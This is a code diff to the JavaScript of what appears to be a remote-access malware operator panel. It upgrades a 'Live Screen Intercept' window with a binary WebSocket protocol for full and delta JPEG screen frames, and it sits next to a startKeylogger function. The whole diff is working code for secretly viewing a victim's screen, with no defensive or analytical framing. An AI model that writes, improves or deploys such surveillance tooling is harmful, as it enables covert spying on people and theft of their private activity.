@@ -1604,15 +1604,18 @@ function startStream() {
         </div>
     `;
     const win = createDragWindow('stream-win', 'Live Screen Intercept (ULTRA)', 'fa-solid fa-desktop', html);
-    win.style.width = '900px';
+    win.style.width = '960px';
     win.style.height = '600px';
 
-    const canvas = document.getElementById('stream-canvas');
-    const ctx = canvas.getContext('2d', { alpha: false });
+    const mainCanvas = document.getElementById('stream-canvas');
+    const mainCtx = mainCanvas.getContext('2d', { alpha: false });
     const fpsEl = document.getElementById('stream-fps-counter');
     const statusEl = document.getElementById('stream-status');
 
+    let offCanvas = null;
+    let offCtx = null;
     let framesThisSecond = 0;
+
     setInterval(() => {
         fpsEl.textContent = framesThisSecond + ' FPS';
         framesThisSecond = 0;
@@ -1626,34 +1629,54 @@ function startStream() {
     streamWs.onclose = () => { statusEl.textContent = 'OFFLINE'; statusEl.style.borderColor = 'var(--danger)'; };
 
     streamWs.onmessage = async (msg) => {
-        const data = new Uint8Array(msg.data);
-        if (data.length < 11) return;
+        const buffer = msg.data;
+        const view = new DataView(buffer);
+        if (buffer.byteLength < 4) return;
 
-        const type = data[0];
-        const x = data[1] | (data[2] << 8);
-        const y = data[3] | (data[4] << 8);
-        const w = data[5] | (data[6] << 8);
-        const h = data[7] | (data[8] << 8);
-        const imgLen = data[9] | (data[10] << 8); // Note: builder.go uses 2 bytes for len at pkt[9]
-
-        const imgData = data.slice(11);
-        const blob = new Blob([imgData], { type: 'image/jpeg' });
+        const type = view.getUint8(0);
+        const codec = view.getUint8(1);
+        const payloadLen = view.getUint16(2, true); // Little endian
         
-        try {
-            const bitmap = await createImageBitmap(blob);
-            // Auto-resize canvas if needed
-            if (canvas.width < x + w) canvas.width = x + w;
-            if (canvas.height < y + h) canvas.height = y + h;
+        // Payload starts at 4
+        if (type === 0x01) { // Full Frame [W:2][H:2][JPEG...]
+            const w = view.getUint16(4, true);
+            const h = view.getUint16(6, true);
+            const jpeg = new Uint8Array(buffer, 8);
             
-            ctx.drawImage(bitmap, x, y, w, h);
+            if (!offCanvas || offCanvas.width !== w || offCanvas.height !== h) {
+                offCanvas = new OffscreenCanvas(w, h);
+                offCtx = offCanvas.getContext('2d', { alpha: false });
+                mainCanvas.width = w;
+                mainCanvas.height = h;
+            }
+
+            const blob = new Blob([jpeg], { type: 'image/jpeg' });
+            const bitmap = await createImageBitmap(blob);
+            offCtx.drawImage(bitmap, 0, 0);
             bitmap.close();
+            requestAnimationFrame(() => mainCtx.drawImage(offCanvas, 0, 0));
             framesThisSecond++;
-        } catch (e) {
-            console.error("Frame decode error", e);
+
+        } else if (type === 0x02) { // Delta Frame [X:2][Y:2][W:2][H:2][JPEG...]
+            if (!offCtx) return;
+            const x = view.getUint16(4, true);
+            const y = view.getUint16(6, true);
+            const w = view.getUint16(8, true);
+            const h = view.getUint16(10, true);
+            const jpeg = new Uint8Array(buffer, 12);
+
+            const blob = new Blob([jpeg], { type: 'image/jpeg' });
+            try {
+                const bitmap = await createImageBitmap(blob);
+                offCtx.drawImage(bitmap, x, y, w, h);
+                bitmap.close();
+                requestAnimationFrame(() => mainCtx.drawImage(offCanvas, 0, 0));
+                framesThisSecond++;
+            } catch(e) {}
         }
     };
 
-    win.onclose = () => { streamWs.close(); };
+    win.onClose = () => { streamWs.close(); };
 }
 
 function startKeylogger() {
